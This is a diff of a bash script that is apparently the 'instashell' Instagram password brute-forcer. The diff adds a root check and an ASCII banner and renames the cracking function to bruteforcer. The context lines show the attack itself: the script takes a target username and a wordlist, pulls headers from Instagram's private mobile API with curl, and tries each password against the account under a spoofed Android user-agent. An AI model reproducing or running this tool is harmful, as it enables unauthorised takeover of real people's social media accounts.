@@ -1,6 +1,25 @@
 #!/bin/bash
 # Coded by @thelinuxchoice (Instagram)
+checkroot() {
+if [[ "$(id -u)" -ne 0 ]]; then
+    printf "\e[1:77mPlease, run this program as root\n\e[0m"
+fi
+}
 
+banner() {
+
+
+printf "▪   ▐ ▄ .▄▄ · ▄▄▄▄▄ ▄▄▄· .▄▄ ·  ▄ .▄▄▄▄ .▄▄▌  ▄▄▌  \n"
+printf "██ •█▌▐█▐█ ▀. •██  ▐█ ▀█ ▐█ ▀. ██▪▐█▀▄.▀·██•  ██•  \n"
+printf "▐█·▐█▐▐▌▄▀▀▀█▄ ▐█.▪▄█▀▀█ ▄▀▀▀█▄██▀▐█▐▀▀▪▄██▪  ██▪  \n"
+printf "▐█▌██▐█▌▐█▄▪▐█ ▐█▌·▐█ ▪▐▌▐█▄▪▐███▌▐▀▐█▄▄▌▐█▌▐▌▐█▌▐▌\n"
+printf "▀▀▀▀▀ █▪ ▀▀▀▀  ▀▀▀  ▀  ▀  ▀▀▀▀ ▀▀▀ · ▀▀▀ .▀▀▀ .▀▀▀ \n"
+
+
+
+}
+banner
+checkroot
 read -p $'\e[1;92mUsername account: \e[0m' user
 read -p $'\e[1;92mPassword List: \e[0m' wl_pass
 
@@ -24,7 +43,7 @@ var=$(curl -i -s -H "$header" https://i.instagram.com/api/v1/si/fetch_headers/?c
 var2=$(echo $var | awk -F ';' '{print $2}' | cut -d '=' -f3)
 #echo $var2
 
-function crack() {
+function bruteforcer() {
 for pass in $(cat $wl_pass); do
 
 header='Connection: "close", "Accept": "*/*", "Content-type": "application/x-www-form-urlencoded; charset=UTF-8", "Cookie2": "$Version=1" "Accept-Language": "en-US", "User-Agent": "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'
@@ -62,5 +81,6 @@ fi
 
 done
 }
-crack
+
+bruteforcer
 
